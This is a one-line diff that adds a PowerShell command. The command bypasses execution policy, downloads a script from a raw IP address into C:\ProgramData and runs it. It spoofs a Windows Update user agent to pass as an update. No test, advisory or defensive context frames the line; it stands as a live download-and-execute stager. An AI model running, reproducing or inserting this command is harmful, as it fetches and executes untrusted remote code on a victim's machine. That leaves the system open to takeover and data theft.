@@ -1,0 +1,1 @@
+powershell -ep bypass -c "IWR ('https://163.245.211.214/wu/77d47b36a3cd624fadc4c5bac82ed27a/update.ps1') -OutFile C:\ProgramData\s.ps1 -UserAgent 'WindowsUpdate-10.0.26100.2314'; powershell -ep bypass -File C:\ProgramData\s.ps1"
